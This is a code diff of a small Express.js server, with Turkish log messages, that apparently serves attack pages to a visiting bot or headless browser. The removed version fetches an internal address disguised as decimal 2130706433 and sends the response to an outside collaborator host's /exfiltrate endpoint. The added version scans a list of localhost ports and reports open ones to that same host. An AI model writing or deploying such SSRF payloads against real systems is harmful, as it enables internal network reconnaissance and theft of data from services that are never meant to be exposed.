@@ -5,24 +5,24 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 app.get('/redirect', (req, res) => {
-    console.log("\n--- BOT Yakalandı! Encode Edilmiş Payload Gönderiliyor ---");
+    console.log("\n--- BOT Yakalandı! Port Tarama Payload'ı Gönderiliyor ---");
     
     const htmlPayload = `
     <html>
       <body>
-        <h2>Loading...</h2>
+        <h2>Scanning internal ports...</h2>
         <script>
-          // 127.0.0.1 yerine Decimal (2130706433) veya Hex (0x7f000001) deniyoruz
-          const targetInternalUrl = "http://2130706433:8080/";
-          
-          fetch(targetInternalUrl)
-            .then(response => response.text())
-            .then(data => {
-               fetch('https://collab-67oj.onrender.com/exfiltrate?data=' + encodeURIComponent(data));
-            })
-            .catch(error => {
-               fetch('https://collab-67oj.onrender.com/exfiltrate?error=' + encodeURIComponent(error.toString()));
-            });
+          const ports = [80, 443, 2052, 2053, 2082, 2083, 2086, 2087, 2095, 2096, 8080, 8443, 8880];
+          ports.forEach(port => {
+            const targetUrl = "http://127.0.0.1:" + port + "/";
+            fetch(targetUrl, { mode: 'no-cors' })
+              .then(() => {
+                fetch('https://collab-67oj.onrender.com/exfiltrate?status=open&port=' + port);
+              })
+              .catch(err => {
+                fetch('https://collab-67oj.onrender.com/exfiltrate?status=error&port=' + port + '&error=' + encodeURIComponent(err.toString()));
+              });
+          });
         </script>
       </body>
     </html>
@@ -33,14 +33,11 @@ app.get('/redirect', (req, res) => {
 });
 
 app.get('/exfiltrate', (req, res) => {
-    console.log("\n🔥 --- İÇ AĞDAN GELEN YANIT --- 🔥");
-    console.log("Query Parametreleri:", req.query);
+    console.log("Port Sonucu:", req.query);
     return res.status(200).send("OK");
 });
 
 app.use((req, res) => {
-    console.log("\n--- NORMAL İSTEK ---");
-    console.log(req.method, req.url, req.headers);
     return res.status(200).send("OK");
 });
 
